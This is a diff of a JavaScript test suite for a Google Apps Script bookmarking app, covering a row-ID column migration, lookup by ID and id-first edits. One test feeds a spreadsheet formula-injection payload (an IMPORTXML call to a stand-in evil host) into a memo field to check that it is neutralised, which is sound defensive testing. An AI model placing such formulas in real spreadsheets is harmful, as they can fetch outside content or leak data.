@@ -62,19 +62,31 @@ function createFolderStub(name) {
  * - getFormulas: 数式が入ったセルはその数式文字列、それ以外は '' を返す
  *   （fileId抽出は Driveファイル列の HYPERLINK数式から行うため、この再現が必須）
  */
-function createSheetStub() {
+function createSheetStub(maxColumns = 26) {
   const rows = [];       // 表示値（getValues 用）
   const formulas = [];   // 数式（getFormulas 用）。数式でないセルは ''
+  // 実スプレッドシートは既定で26列（A〜Z）あり、getRange はこの範囲外を拒否する。
+  // ID列（H列=8）の確保処理を検証するため、列数の上限を再現する。
+  let columnCount = maxColumns;
   return {
     _rows: rows,
     _formulas: formulas,
+    get _columnCount() { return columnCount; },
     appendRow(values) {
       rows.push(values.slice());
       formulas.push(values.map(() => '')); // 追記直後は数式なし
     },
     setFrozenRows() {},
     getLastRow() { return rows.length; },
+    getMaxColumns() { return columnCount; },
+    insertColumnsAfter(afterPosition, howMany) {
+      columnCount += howMany;
+    },
     getRange(row, col, numRows, numCols) {
+      // 実Sheetsと同じく、シートの列数を超える範囲指定は拒否する
+      if (col + (numCols || 1) - 1 > columnCount) {
+        throw new Error('スタブ: 範囲が列数を超えています (col=' + col + ', max=' + columnCount + ')');
+      }
       return {
         setFormula(formula) {
           formulas[row - 1][col - 1] = formula;
@@ -89,6 +101,34 @@ function createSheetStub() {
         getValue() {
           const line = rows[row - 1];
           return line ? line[col - 1] : undefined;
+        },
+        // 実Sheetsの getValues は範囲内の未設定セルを '' として返す（undefinedにはならない）。
+        // ID列マイグレーションは「空セルかどうか」で判定するため、この再現が必須。
+        getValues() {
+          const rn = numRows || 1;
+          const cn = numCols || 1;
+          const out = [];
+          for (let r = 0; r < rn; r++) {
+            const line = [];
+            for (let c = 0; c < cn; c++) {
+              const source = rows[row - 1 + r];
+              const cell = source ? source[col - 1 + c] : undefined;
+              line.push(cell === undefined ? '' : cell);
+            }
+            out.push(line);
+          }
+          return out;
+        },
+        setValues(values) {
+          for (let r = 0; r < values.length; r++) {
+            const target = row - 1 + r;
+            if (!rows[target]) { continue; }
+            for (let c = 0; c < values[r].length; c++) {
+              rows[target][col - 1 + c] = values[r][c];
+              // 値を入れると数式は消える（実挙動と同じ）
+              if (formulas[target]) { formulas[target][col - 1 + c] = ''; }
+            }
+          }
         },
         getFormulas() {
           const rn = numRows || 1;
@@ -183,6 +223,7 @@ function loadGasScript(options = {}) {
   const fetchCalls = [];
   const docsById = {}; // ドキュメントID -> ハンドル（DocumentApp.create/openById共有）
   let docIdCounter = 0;
+  let uuidCounter = 0; // Utilities.getUuid スタブの連番（loadGasScript ごとにリセット）
   const scriptProps = Object.assign({}, options.scriptProperties || {});
   if (!('CATEGORIES_JSON' in scriptProps)) {
     scriptProps.CATEGORIES_JSON = JSON.stringify(options.categories || TEST_DEFAULT_CATEGORIES);
@@ -190,7 +231,7 @@ function loadGasScript(options = {}) {
 
   // コンテナバインド前提: アクティブなスプレッドシート（＝バインド先本体）は1つだけ、
   // 最初は空のシートを1枚持つ状態で存在する。
-  const activeSheet = createSheetStub();
+  const activeSheet = createSheetStub(options.maxColumns);
   const activeSpreadsheet = { getSheets: () => [activeSheet] };
 
   const context = {
@@ -242,6 +283,11 @@ function loadGasScript(options = {}) {
     },
     // --- Utilities スタブ（formatDate は固定日時で単純実装） ---
     Utilities: {
+      // getUuid は本物と違い連番で再現可能な値を返す（テストで発行順を検証できるようにするため）。
+      // 「呼ぶたびに異なる値になる」という本質的な性質は満たしている。
+      getUuid() {
+        return 'uuid-' + (++uuidCounter);
+      },
       formatDate(date, tz, pattern) {
         const pad = (n) => String(n).padStart(2, '0');
         return pattern
@@ -331,7 +377,7 @@ test('正常系: タイトル取得 → Sheetsインデックスに1行追記さ
   assert.strictEqual(sheet._rows.length, 2, 'ヘッダ行 + データ1行');
   assert.deepStrictEqual(
     Array.from(sheet._rows[0]),
-    ['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ']
+    ['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']
   );
   assert.strictEqual(sheet._rows[1][1], 'PC系');
   assert.strictEqual(sheet._rows[1][2], 'テスト記事のタイトル'); // HYPERLINKの表示値
@@ -354,7 +400,7 @@ test('正常系: 2回目以降の保存でもヘッダー行は重複せず、�
   callDoPost(context, { url: 'https://example.com/2', category: 'DTP系' });
 
   assert.strictEqual(sheet._rows.length, 3, 'ヘッダ + データ2行');
-  assert.deepStrictEqual(Array.from(sheet._rows[0]), ['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ']);
+  assert.deepStrictEqual(Array.from(sheet._rows[0]), ['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
 });
 
 // ---- タイトル取得のフォールバック -----------------------------
@@ -830,7 +876,7 @@ test('コンテナバインド: getActiveSpreadsheetの最初のシートを使�
   assert.strictEqual(returned, sheet, 'アクティブなスプレッドシートの1枚目のシートを返す');
   assert.deepStrictEqual(
     Array.from(sheet._rows[0]),
-    ['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ']
+    ['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']
   );
 });
 
@@ -1373,10 +1419,393 @@ test('Code.gs: 主要関数の定義がそれぞれちょうど1つである（�
     'rebuildDocContent_', 'extractDocOriginalUrl_', 'extractDocBodyText_',
     'getTags_', 'saveTags_', 'sanitizeTagName_', 'normalizeTagsInput_',
     'handleAddTag_', 'handleRemoveTag_', 'handleReorderTags_', 'fetchPageTitle_',
-    'splitTagsText_'
+    'splitTagsText_', 'migrateRowIds_', 'findRowIndexById_', 'ensureIndexColumns_'
   ];
   for (const fn of names) {
     const definitions = source.match(new RegExp('function ' + fn + '\\(', 'g')) || [];
     assert.strictEqual(definitions.length, 1, fn + ' の定義がちょうど1つであること');
   }
 });
+
+// ============================================================
+// ID列（行一意ID）のマイグレーションと、id優先の編集
+// ============================================================
+
+// ---- migrateRowIds_（冪等性・想定外状態） ----------------------
+
+test('migrateRowIds_: ID列が空の既存行にUUIDが発行される', () => {
+  const { context, sheet } = loadGasScript();
+  // 移行前の7列（ID列なし）のシートを再現する
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '']);
+  sheet.appendRow(['2026-07-02 10:00', 'カテゴリA', '記事2', 'https://example.com/2', '', '', '']);
+
+  context.getOrCreateIndexSheet_();
+
+  assert.strictEqual(sheet._rows[0][7], 'ID', 'H1にID列のヘッダーが補完される');
+  assert.ok(sheet._rows[1][7], '既存行1にIDが発行される');
+  assert.ok(sheet._rows[2][7], '既存行2にIDが発行される');
+  assert.notStrictEqual(sheet._rows[1][7], sheet._rows[2][7], '行ごとに異なるIDが振られる');
+  assert.strictEqual(sheet._rows.length, 3, '行は増減しない');
+});
+
+test('migrateRowIds_: 何度実行してもID列の値が変わらない（冪等性）', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '']);
+  sheet.appendRow(['2026-07-02 10:00', 'カテゴリA', '記事2', 'https://example.com/2', '', '', '']);
+
+  context.getOrCreateIndexSheet_();
+  const firstPass = sheet._rows.map((r) => r[7]);
+
+  // 実運用で一覧を複数回GETした状況に相当する（getOrCreateIndexSheet_ が毎回走る）
+  context.getOrCreateIndexSheet_();
+  context.getOrCreateIndexSheet_();
+
+  assert.deepStrictEqual(sheet._rows.map((r) => r[7]), firstPass, '2回目以降の実行でIDが変化しない');
+});
+
+test('migrateRowIds_: 既存IDが数値型でも上書きせず温存する', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+  // ID列がテキストではなく数値として保存されているシート（想定外状態）
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '', 12345]);
+  sheet.appendRow(['2026-07-02 10:00', 'カテゴリA', '記事2', 'https://example.com/2', '', '', '', '']);
+
+  context.getOrCreateIndexSheet_();
+
+  assert.strictEqual(sheet._rows[1][7], 12345, '数値のIDは型ごと温存される');
+  assert.ok(sheet._rows[2][7], '空の行にだけ新しいIDが発行される');
+});
+
+test('migrateRowIds_: 既存IDが重複していても修復しない（既存値優先）', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '', 'dup-1']);
+  sheet.appendRow(['2026-07-02 10:00', 'カテゴリA', '記事2', 'https://example.com/2', '', '', '', 'dup-1']);
+
+  context.getOrCreateIndexSheet_();
+
+  assert.strictEqual(sheet._rows[1][7], 'dup-1', '重複IDは書き換えられない');
+  assert.strictEqual(sheet._rows[2][7], 'dup-1', '重複IDは書き換えられない');
+});
+
+test('migrateRowIds_: データ行が無いシート（ヘッダーのみ）でも例外にならない', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+
+  context.getOrCreateIndexSheet_(); // 例外が出ないこと自体が検証内容
+
+  assert.strictEqual(sheet._rows.length, 1, 'ヘッダーのみのまま変化しない');
+});
+
+test('migrateRowIds_: 列を7列に切り詰めたシートでもID列を確保してから移行する', () => {
+  // 余分な列を削除して運用しているシート（想定外状態）。
+  // ID列（H列=8）が存在しないため、確保せずに書くと範囲外エラーになる
+  const { context, sheet } = loadGasScript({ maxColumns: 7 });
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '']);
+
+  context.getOrCreateIndexSheet_();
+
+  assert.ok(sheet._columnCount >= 8, 'ID列ぶんの列が追加される');
+  assert.strictEqual(sheet._rows[0][7], 'ID', 'ヘッダーが書き込める');
+  assert.ok(sheet._rows[1][7], '既存行にIDが発行される');
+});
+
+test('migrateRowIds_: ヘッダ行が2行あるシートでも2行目はデータ行として扱われIDが振られる', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+  // 誤って見出しが2行入っているシート（想定外状態）。行削除等の修復はしない方針
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', '']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '', '']);
+
+  context.getOrCreateIndexSheet_();
+
+  assert.ok(sheet._rows[1][7], '2行目もデータ行としてIDが振られる（害はないため修復しない）');
+  assert.ok(sheet._rows[2][7], '実データ行にもIDが振られる');
+  assert.strictEqual(sheet._rows.length, 3, '行の削除・追加は行わない');
+});
+
+// ---- appendIndexRow_ / 一覧API ---------------------------------
+
+test('save: 新規保存した行には必ずIDが付与され、一覧APIでも返る', () => {
+  const { context, sheet } = loadGasScript({
+    categories: ['カテゴリA'],
+    fetchImpl: () => makeFetchResponse({ body: '<title>新規記事</title>' })
+  });
+
+  const result = callDoPost(context, { url: 'https://example.com/new', category: 'カテゴリA' });
+  assert.strictEqual(result.ok, true);
+
+  const id = sheet._rows[1][7];
+  assert.ok(id, 'ID列に値が入る');
+
+  const list = callDoGetList(context, 'カテゴリA');
+  assert.strictEqual(list.ok, true);
+  assert.strictEqual(list.items.length, 1);
+  assert.strictEqual(list.items[0].id, id, '一覧APIが items[].id を返す');
+});
+
+test('save: 連続保存した行のIDは互いに異なる', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/1', category: 'カテゴリA' });
+  callDoPost(context, { url: 'https://example.com/2', category: 'カテゴリA' });
+
+  assert.ok(sheet._rows[1][7]);
+  assert.ok(sheet._rows[2][7]);
+  assert.notStrictEqual(sheet._rows[1][7], sheet._rows[2][7], '行ごとに一意なIDになる');
+});
+
+test('一覧API: 移行前の旧データ（ID列が空）でも、一覧取得時にIDが振られて返る', () => {
+  const { context } = loadGasScript({ categories: ['カテゴリA'] });
+  seedLegacyArticle(context, {
+    savedAt: '2026-07-01 10:00', category: 'カテゴリA',
+    title: '旧記事', url: 'https://example.com/old', memo: ''
+  });
+
+  const list = callDoGetList(context, 'カテゴリA');
+
+  assert.strictEqual(list.items.length, 1);
+  assert.ok(list.items[0].id, 'マイグレーションで振られたIDが一覧に含まれる');
+  assert.ok(list.items[0].fileId, '旧データは fileId も引き続き返る');
+});
+
+// ---- findRowIndexById_ -----------------------------------------
+
+test('findRowIndexById_: 一致行の行番号を返し、未知のIDには -1 を返す', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '', 'id-a']);
+  sheet.appendRow(['2026-07-02 10:00', 'カテゴリA', '記事2', 'https://example.com/2', '', '', '', 'id-b']);
+
+  assert.strictEqual(context.findRowIndexById_(sheet, sheet.getLastRow(), 'id-a'), 2);
+  assert.strictEqual(context.findRowIndexById_(sheet, sheet.getLastRow(), 'id-b'), 3);
+  assert.strictEqual(context.findRowIndexById_(sheet, sheet.getLastRow(), 'id-none'), -1);
+});
+
+test('findRowIndexById_: ID重複時は先頭（最古）の行を返す', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '古い方', 'https://example.com/1', '', '', '', 'dup']);
+  sheet.appendRow(['2026-07-02 10:00', 'カテゴリA', '新しい方', 'https://example.com/2', '', '', '', 'dup']);
+
+  assert.strictEqual(
+    context.findRowIndexById_(sheet, sheet.getLastRow(), 'dup'), 2,
+    '先頭の一致行を採用する'
+  );
+});
+
+test('findRowIndexById_: 数値型で保存されたIDにも文字列比較で一致する', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '', 12345]);
+
+  assert.strictEqual(context.findRowIndexById_(sheet, sheet.getLastRow(), '12345'), 2);
+});
+
+test('findRowIndexById_: 空ID・データ行なしでは -1 を返す（空セルへの誤一致防止）', () => {
+  const { context, sheet } = loadGasScript();
+  sheet.appendRow(['日時', 'カテゴリ', 'タイトル', 'URL', 'メモ', 'Driveファイル', 'タグ', 'ID']);
+  sheet.appendRow(['2026-07-01 10:00', 'カテゴリA', '記事1', 'https://example.com/1', '', '', '', '']);
+
+  // ID列が空の行に対し空IDで検索しても一致してはいけない（全行が誤ヒットするのを防ぐ）
+  assert.strictEqual(context.findRowIndexById_(sheet, sheet.getLastRow(), ''), -1);
+  assert.strictEqual(context.findRowIndexById_(sheet, sheet.getLastRow(), '   '), -1);
+  assert.strictEqual(context.findRowIndexById_(sheet, 1, 'id-a'), -1, 'データ行が無ければ -1');
+});
+
+// ---- handleUpdate_（id優先・fileIdフォールバック） ---------------
+
+test('update: id指定で該当行のSheetsが更新される', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA' });
+  const id = sheet._rows[1][7];
+
+  const result = callDoPost(context, {
+    action: 'update', id: id,
+    title: '編集後タイトル', url: 'https://example.com/edited', memo: '編集後メモ'
+  });
+
+  assert.strictEqual(result.ok, true);
+  assert.strictEqual(result.id, id);
+  assert.strictEqual(sheet._rows[1][2], '編集後タイトル', 'タイトル（HYPERLINK表示値）が更新される');
+  assert.strictEqual(sheet._rows[1][3], 'https://example.com/edited');
+  assert.strictEqual(sheet._rows[1][4], '編集後メモ');
+  assert.strictEqual(sheet._rows[1][7], id, 'IDは編集で変化しない');
+});
+
+test('update: id指定は DocumentApp を一切呼ばない（新規記事はDocを持たないため）', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA' });
+  const id = sheet._rows[1][7];
+
+  // DocumentApp.openById が呼ばれたら即座に失敗させる
+  context.DocumentApp.openById = () => {
+    throw new Error('id指定の編集で DocumentApp.openById が呼ばれてはいけない');
+  };
+
+  const result = callDoPost(context, {
+    action: 'update', id: id, title: 'タイトル', url: 'https://example.com/edited', memo: ''
+  });
+
+  assert.strictEqual(result.ok, true, 'DocumentApp を呼ばずに完了すること');
+});
+
+test('update: fileIdのみ指定なら従来どおりGoogleドキュメント本文も更新される', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  const { fileId } = seedLegacyArticle(context, {
+    savedAt: '2026-07-01 10:00', category: 'カテゴリA',
+    title: '旧記事', url: 'https://example.com/old', memo: '旧メモ'
+  });
+
+  const result = callDoPost(context, {
+    action: 'update', fileId: fileId,
+    title: '新タイトル', url: 'https://example.com/new', memo: '新メモ'
+  });
+
+  assert.strictEqual(result.ok, true);
+  assert.strictEqual(sheet._rows[1][2], '新タイトル', 'Sheets行が更新される');
+
+  const docText = context.DocumentApp.openById(fileId).getBody().getText();
+  assert.match(docText, /# 新タイトル/, 'Doc本文のタイトルが更新される');
+  assert.match(docText, /https:\/\/example\.com\/new/, 'Doc本文のURLが更新される');
+  assert.match(docText, /新メモ/, 'Doc本文のメモが更新される');
+});
+
+test('update: id と fileId の両方が指定されたら id を優先しDocは触らない', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  const { fileId } = seedLegacyArticle(context, {
+    savedAt: '2026-07-01 10:00', category: 'カテゴリA',
+    title: '旧記事', url: 'https://example.com/old', memo: '旧メモ'
+  });
+  // マイグレーションでこの旧行にもIDが振られる
+  context.getOrCreateIndexSheet_();
+  const id = sheet._rows[1][7];
+  assert.ok(id, '前提: 旧行にIDが振られていること');
+  const docBefore = context.DocumentApp.openById(fileId).getBody().getText();
+
+  const result = callDoPost(context, {
+    action: 'update', id: id, fileId: fileId,
+    title: 'id優先で編集', url: 'https://example.com/byid', memo: ''
+  });
+
+  assert.strictEqual(result.ok, true);
+  assert.strictEqual(sheet._rows[1][2], 'id優先で編集', 'Sheets行は更新される');
+  assert.strictEqual(
+    context.DocumentApp.openById(fileId).getBody().getText(), docBefore,
+    'id優先のためDoc本文は変更されない'
+  );
+});
+
+test('update: 未知のidはエラーになり、他の行を書き換えない', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA' });
+  const before = sheet._rows[1].slice();
+
+  const result = callDoPost(context, {
+    action: 'update', id: 'uuid-存在しない',
+    title: '書き換え', url: 'https://evil.example/', memo: ''
+  });
+
+  assert.strictEqual(result.ok, false);
+  assert.match(result.error, /編集対象の記事が見つかりません/);
+  assert.deepStrictEqual(Array.from(sheet._rows[1]), Array.from(before), '既存行は変更されない');
+});
+
+test('update: id も fileId も無ければ「編集対象が指定されていません」', () => {
+  const { context } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA' });
+
+  const result = callDoPost(context, {
+    action: 'update', title: 'タイトル', url: 'https://example.com/x', memo: ''
+  });
+
+  assert.strictEqual(result.ok, false);
+  assert.match(result.error, /編集対象が指定されていません/);
+});
+
+test('update: id・fileId が空文字だけでも「編集対象が指定されていません」', () => {
+  const { context } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA' });
+
+  // PWA側は id/fileId を常に送るため、両方空文字のケースを明示的に守る
+  const result = callDoPost(context, {
+    action: 'update', id: '', fileId: '', title: 'タイトル', url: 'https://example.com/x', memo: ''
+  });
+
+  assert.strictEqual(result.ok, false);
+  assert.match(result.error, /編集対象が指定されていません/);
+});
+
+test('update: id が空文字で fileId のみ有効なら従来のDoc更新経路になる', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  const { fileId } = seedLegacyArticle(context, {
+    savedAt: '2026-07-01 10:00', category: 'カテゴリA',
+    title: '旧記事', url: 'https://example.com/old', memo: '旧メモ'
+  });
+
+  // PWA側が id: '' を常に送る実装のため、空文字が優先キーとして誤採用されないことを守る
+  const result = callDoPost(context, {
+    action: 'update', id: '', fileId: fileId,
+    title: '新タイトル', url: 'https://example.com/new', memo: ''
+  });
+
+  assert.strictEqual(result.ok, true);
+  assert.strictEqual(sheet._rows[1][2], '新タイトル');
+  assert.match(
+    context.DocumentApp.openById(fileId).getBody().getText(), /# 新タイトル/,
+    'fileIdフォールバックとしてDoc本文も更新される'
+  );
+});
+
+test('update: id指定でも入力検証（タイトル必須・URL形式）は従来どおり働く', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA' });
+  const id = sheet._rows[1][7];
+
+  const noTitle = callDoPost(context, {
+    action: 'update', id: id, title: '', url: 'https://example.com/x', memo: ''
+  });
+  assert.strictEqual(noTitle.ok, false);
+  assert.match(noTitle.error, /タイトルを入力してください/);
+
+  const badUrl = callDoPost(context, {
+    action: 'update', id: id, title: 'タイトル', url: 'ftp://example.com/x', memo: ''
+  });
+  assert.strictEqual(badUrl.ok, false);
+  assert.match(badUrl.error, /URLの形式が不正です/);
+});
+
+test('update: id指定でもメモの数式インジェクションは無害化される', () => {
+  const { context, sheet } = loadGasScript({ categories: ['カテゴリA'] });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA' });
+  const id = sheet._rows[1][7];
+
+  const result = callDoPost(context, {
+    action: 'update', id: id, title: 'タイトル',
+    url: 'https://example.com/x', memo: '=IMPORTXML("https://evil.example/","//a")'
+  });
+
+  assert.strictEqual(result.ok, true);
+  assert.strictEqual(
+    sheet._rows[1][4], "'=IMPORTXML(\"https://evil.example/\",\"//a\")",
+    'メモ先頭の = はアポストロフィで無害化されること'
+  );
+});
+
+test('update: id指定でも SHARED_TOKEN 設定時は合言葉が照合される', () => {
+  const { context, sheet } = loadGasScript({
+    categories: ['カテゴリA'], scriptProperties: { SHARED_TOKEN: 'aikotoba' }
+  });
+  callDoPost(context, { url: 'https://example.com/orig', category: 'カテゴリA', token: 'aikotoba' });
+  const id = sheet._rows[1][7];
+
+  const denied = callDoPost(context, {
+    action: 'update', id: id, title: '改ざん', url: 'https://evil.example/', token: 'ちがう'
+  });
+  assert.strictEqual(denied.ok, false);
+  assert.match(denied.error, /合言葉が一致しません/);
+  assert.notStrictEqual(sheet._rows[1][2], '改ざん', '拒否時は行が書き換わらない');
+});
+
